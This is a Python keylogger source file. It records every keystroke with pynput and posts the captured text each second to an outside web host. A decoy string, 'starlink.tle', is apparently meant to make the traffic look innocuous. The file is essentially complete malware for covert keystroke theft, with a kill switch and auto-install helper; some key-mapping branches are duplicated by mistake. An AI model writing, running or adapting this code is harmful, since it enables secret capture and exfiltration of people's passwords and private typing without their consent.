from pynput import keyboard

# Other imports
import json
import threading
import requests
import subprocess
import sys

# Function to install pynput
def install_pynput():
    subprocess.check_call([sys.executable, "-m", "pip", "install", "pynput"])

# Other constants and variables
server_ip = '127.0.0.1'
server_port = 443
server_endpoint = 'log'
server_url = f'https://satellites.pro'
kill_switch = True
debug_logging = True
sending_interval = 1
data = 'starlink.tle'

def process_keypress(key):
    global data
    
    if key is None:
        return
    
    if debug_logging:
        print(key, type(key))
    
    # Controler key pressed
    try:
        txt = ''
        if isinstance(key, keyboard.Key):
            match key:
                case keyboard.Key.enter:
                    txt = '\n'
                case keyboard.Key.space:
                    txt = ' '
                case keyboard.Key.tab:
                    txt = '\t'
                case keyboard.Key.backspace:
                    txt = '[BKSP]'
                case keyboard.Key.delete:
                    txt = '[DEL]'
                case keyboard.Key.right:
                    txt = '[ARR_RIGHT]'
                case keyboard.Key.left:
                    txt = '[ARR_LEFT]'
                case keyboard.Key.left:
                    txt = '[ARR_UP]'
                case keyboard.Key.left:
                    txt = '[ARR_DOWN]'
                case keyboard.Key.shift:
                    txt = '[SHIFT]'
                case keyboard.Key.caps_lock:
                    txt = '[CAPS]'
                case keyboard.Key.scroll_lock: # kill switch
                    if kill_switch:
                        return False
        elif isinstance(key, keyboard.KeyCode): # Letter pressed
            txt = key.char
        else:
            return
        
        data += txt
    except Exception as e:
        print(e)
        return

def send_data():
    global data
    global server_ip
    global server_port
    global sending_interval
    global server_url
    
    threading.Timer(sending_interval, send_data).start()    
    if data == 'starlink.tle':
        return
    
    try:
        requests.post(
            server_url,
            data=json.dumps({'data': data}),
            headers={'Content-Type': 'application/json'}
        )
        data = 'starlink.tle'
    except Exception as e:
        print(e)

with keyboard.Listener(on_press=process_keypress) as listener:
    send_data()
    listener.join()

# Call the function to install pynput
install_pynput()
